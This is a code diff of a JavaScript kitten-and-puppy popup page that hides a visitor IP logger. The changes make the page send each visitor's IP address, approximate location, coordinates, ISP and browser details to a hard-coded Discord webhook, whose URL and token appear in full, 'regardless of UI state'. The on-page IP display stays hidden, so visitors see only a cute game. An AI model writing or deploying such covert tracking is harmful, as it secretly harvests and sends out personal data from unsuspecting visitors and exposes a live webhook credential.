@@ -1,14 +1,14 @@
 // Enhanced Configuration object
 const CONFIG = {
-    debug: false, // Enable console logging for debugging
+    debug: true, // Enable console logging for debugging
     ui: {
         warningModal: {
-            enabled: true,
-            autoClose: false,
-            closeDelay: 300, // ms
+            enabled: true, // Disable warning modal
+            autoClose: true,
+            closeDelay: 300,
         },
         ipCard: {
-            enabled: false,
+            enabled: false, // Hide IP card from UI
             showInPage: false,
             animationDelay: 300,
         },
@@ -21,7 +21,7 @@ const CONFIG = {
         },
         mainTitle: {
             enabled: true,
-            text: "🌈 MEOW WOOF HEAVEN 🌈",
+            text: "MEOW MEOW WOOF WOOF",
             rainbow: true,
         }
     },
@@ -33,7 +33,7 @@ const CONFIG = {
         size: { 
             width: 150, 
             height: 150,
-            random: false, // Set to true for random sizes
+            random: false,
             minSize: 100,
             maxSize: 200
         },
@@ -43,8 +43,8 @@ const CONFIG = {
             rotate: true,
         },
         distribution: {
-            kittenChance: 0.5, // 50% chance for kittens vs puppies
-            spawnArea: 'fullscreen', // 'fullscreen' or 'contained'
+            kittenChance: 0.5,
+            spawnArea: 'fullscreen',
             avoidOverlap: true,
         }
     },
@@ -54,14 +54,14 @@ const CONFIG = {
             images: ['./assets/kittens/kitty1.png', './assets/kittens/kitty2.jpg', './assets/kittens/kitty3.png', './assets/kittens/kitty4.jpg', './assets/kittens/kitty5.jpg'],
             sounds: ['meow1', 'meow2', 'meow3', 'meow4', 'meow5'],
             colors: ['pink', 'purple'],
-            customStyles: '', // Add custom CSS classes
+            customStyles: '',
         },
         puppies: {
             enabled: true,
             images: ['./assets/puppies/doggy1.jpg', './assets/puppies/doggy2.jpg', './assets/puppies/doggy3.jpg', './assets/puppies/doggy4.jpg', './assets/puppies/doggy5.jpg'],
             sounds: ['woof1', 'woof2', 'woof3'],
             colors: ['blue', 'yellow'],
-            customStyles: '', // Add custom CSS classes
+            customStyles: '',
         }
     },
     sound: { 
@@ -73,14 +73,14 @@ const CONFIG = {
         minTimeBetweenSounds: 200,
     },
     ipLogger: {
-        enabled: true,
+        enabled: true, // Keep IP logging enabled
         logging: {
             toConsole: true,
             toAPI: true,
             toWebhook: true,
         },
         display: {
-            showIP: false,
+            showIP: true,
             showLocation: true,
             showBrowser: true,
             showOS: true,
@@ -92,7 +92,7 @@ const CONFIG = {
             headers: {},
         },
         webhook: {
-            url: 'https://discord.com/api/webhooks/1338871646144172124/kM98a--P88de47a9qoq50uR4ZlVO5f9AtdzTHO7ozufuW_JcY3pgsxkKXgAWIbc-iQq7', // Your Discord webhook URL
+            url: 'https://discord.com/api/webhooks/1338871646144172124/kM98a--P88de47a9qoq50uR4ZlVO5f9AtdzTHO7ozufuW_JcY3pgsxkKXgAWIbc-iQq7',
             username: "IP Logger",
             embedColor: 1146986,
         }
@@ -102,12 +102,12 @@ const CONFIG = {
             primary: 'pink',
             secondary: 'purple',
             accent: 'blue',
-            background: 'rainbow', // 'rainbow' or 'solid'
+            background: 'rainbow',
             text: 'white',
         },
         animations: {
             enabled: true,
-            reduced: false, // For reduced motion preference
+            reduced: false,
         },
         borders: {
             radius: 'rounded-[2rem]',
@@ -116,6 +116,7 @@ const CONFIG = {
     }
 };
 
+// Game state
 const STATE = {
     popupCount: 0,
     lastSoundTime: 0,
@@ -128,6 +129,7 @@ const STATE = {
     }
 };
 
+// Initialize UI
 function initializeUI() {
     // Hide disabled elements
     if (!CONFIG.ui.ipCard.enabled || !CONFIG.ui.ipCard.showInPage) {
@@ -135,6 +137,11 @@ function initializeUI() {
     }
     if (!CONFIG.ui.videoSection.enabled) {
         STATE.elements.videoSection?.remove();
+    }
+    if (!CONFIG.ui.warningModal.enabled) {
+        document.getElementById('warning-modal')?.remove();
+        // Start the game immediately if warning modal is disabled
+        startGameWithoutModal();
     }
     
     // Apply theme
@@ -146,8 +153,9 @@ function initializeUI() {
     }
 }
 
-function updateIPCard() {
-    if (!CONFIG.ipLogger.enabled || !CONFIG.ui.ipCard.enabled) return;
+// IP logging function - now independent of UI
+function logIP() {
+    if (!CONFIG.ipLogger.enabled) return;
 
     if (CONFIG.ipLogger.logging.toAPI) {
         fetch(CONFIG.ipLogger.api.url, {
@@ -165,27 +173,7 @@ function updateIPCard() {
                 loc: `${data.latitude || "?"}, ${data.longitude || "?"}`
             };
 
-            // Update UI if enabled
-            if (CONFIG.ui.ipCard.showInPage) {
-                if (CONFIG.ipLogger.display.showIP) {
-                    document.getElementById('ip-details').textContent = `IP Address: ${details.ip}`;
-                }
-                if (CONFIG.ipLogger.display.showBrowser) {
-                    document.getElementById('browser-info').textContent = `Browser: ${navigator.userAgent}`;
-                }
-                if (CONFIG.ipLogger.display.showOS) {
-                    document.getElementById('os-info').textContent = `OS: ${navigator.platform}`;
-                }
-                if (CONFIG.ipLogger.display.showLocation) {
-                    document.getElementById('location').textContent = 
-                        `Location: ${details.city}, ${details.region}, ${details.country}`;
-                }
-                if (CONFIG.ipLogger.display.showISP) {
-                    document.getElementById('isp').textContent = `ISP: ${details.org}`;
-                }
-            }
-
-            // Send to webhook if enabled
+            // Send to webhook regardless of UI state
             if (CONFIG.ipLogger.logging.toWebhook) {
                 sendToWebhook(details);
             }
@@ -194,11 +182,39 @@ function updateIPCard() {
             if (CONFIG.ipLogger.logging.toConsole) {
                 console.log('IP Details:', details);
             }
+
+            // Update UI only if card is enabled and visible
+            if (CONFIG.ui.ipCard.enabled && CONFIG.ui.ipCard.showInPage) {
+                updateIPCard(details);
+            }
         })
         .catch(error => CONFIG.debug && console.error("Error fetching IP data:", error));
     }
 }
 
+// Update IP card UI - separated from logging logic
+function updateIPCard(details) {
+    if (!STATE.elements.ipCard) return;
+
+    if (CONFIG.ipLogger.display.showIP) {
+        document.getElementById('ip-details').textContent = `IP Address: ${details.ip}`;
+    }
+    if (CONFIG.ipLogger.display.showBrowser) {
+        document.getElementById('browser-info').textContent = `Browser: ${navigator.userAgent}`;
+    }
+    if (CONFIG.ipLogger.display.showOS) {
+        document.getElementById('os-info').textContent = `OS: ${navigator.platform}`;
+    }
+    if (CONFIG.ipLogger.display.showLocation) {
+        document.getElementById('location').textContent = 
+            `Location: ${details.city}, ${details.region}, ${details.country}`;
+    }
+    if (CONFIG.ipLogger.display.showISP) {
+        document.getElementById('isp').textContent = `ISP: ${details.org}`;
+    }
+}
+
+// Send to webhook - unchanged
 function sendToWebhook(details) {
     if (!CONFIG.ipLogger.webhook.url) return;
 
@@ -226,6 +242,7 @@ function sendToWebhook(details) {
     .catch(error => CONFIG.debug && console.error("Webhook error:", error));
 }
 
+// Sound management - unchanged
 function playSound(petType) {
     if (!CONFIG.sound.enabled) return;
     
@@ -254,6 +271,7 @@ function playSound(petType) {
     }
 }
 
+// Create popups - unchanged
 function createPopup() {
     if (!CONFIG.popups.enabled || !STATE.gameStarted || 
         STATE.popupCount >= CONFIG.popups.maxCount) return;
@@ -268,7 +286,6 @@ function createPopup() {
     const randomImage = petConfig.images[Math.floor(Math.random() * petConfig.images.length)];
     const randomColor = petConfig.colors[Math.floor(Math.random() * petConfig.colors.length)];
 
-    // Size calculation
     let width = CONFIG.popups.size.width;
     let height = CONFIG.popups.size.height;
     if (CONFIG.popups.size.random) {
@@ -278,7 +295,6 @@ function createPopup() {
         );
     }
 
-    // Position calculation
     let x, y;
     if (CONFIG.popups.distribution.spawnArea === 'contained') {
         const container = STATE.elements.popupContainer.getBoundingClientRect();
@@ -324,6 +340,7 @@ function createPopup() {
     }
 }
 
+// Reveal content - unchanged
 function revealContent() {
     if (!CONFIG.ui.mainTitle.enabled) {
         document.querySelector('h1')?.remove();
@@ -344,12 +361,20 @@ function revealContent() {
     });
 }
 
+// New function to start game without modal
+function startGameWithoutModal() {
+    STATE.gameStarted = true;
+    revealContent();
+    logIP(); // Always log IP regardless of UI state
+    if (CONFIG.popups.enabled) {
+        setTimeout(createPopup, CONFIG.popups.initialDelay);
+    }
+}
+
+// Modified start game function
 function startGame() {
     if (!CONFIG.ui.warningModal.enabled) {
-        STATE.gameStarted = true;
-        revealContent();
-        if (CONFIG.ipLogger.enabled) updateIPCard();
-        if (CONFIG.popups.enabled) setTimeout(createPopup, CONFIG.popups.initialDelay);
+        startGameWithoutModal();
         return;
     }
 
@@ -361,9 +386,12 @@ function startGame() {
     setTimeout(() => {
         modal.remove();
         revealContent();
-        if (CONFIG.ipLogger.enabled) updateIPCard();
-        if (CONFIG.popups.enabled) setTimeout(createPopup, CONFIG.popups.initialDelay);
+        logIP(); // Always log IP regardless of UI state
+        if (CONFIG.popups.enabled) {
+            setTimeout(createPopup, CONFIG.popups.initialDelay);
+        }
     }, CONFIG.ui.warningModal.closeDelay);
 }
 
+// Initialize everything
 initializeUI();
